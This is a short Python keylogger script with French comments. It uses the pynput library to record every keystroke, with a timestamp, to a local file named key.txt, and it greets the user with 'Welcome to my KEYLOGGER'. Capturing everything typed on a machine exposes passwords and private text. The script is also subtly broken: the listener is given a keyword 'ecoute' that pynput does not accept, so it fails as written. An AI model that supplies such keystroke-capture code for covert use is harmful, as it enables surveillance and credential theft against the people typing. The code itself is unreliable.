from pynput.keyboard import Key, Listener
import logging
import time
# bibliothèque pour écouter les frappes clavier et enregistrer les frappes dans un fichier

print("Welcome to my KEYLOGGER")

## Configuration du logging pour enregistrer les frappes dans un fichier
logging.basicConfig(filename="key.txt",level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    """str -> None  
    Fonction appelée à chaque fois qu'une touche est pressée"""
    logging.debug(key)
    # enregistre la touche pressée dans le fichier key.txt avec un timestamp 
    


 

# permet de garder le programme en cours d'exécution pour écouter les frappes
with Listener(ecoute=on_press) as l:

    l.join()
    # permet d'éviter que le programme se termine immédiatement après le lancement du listener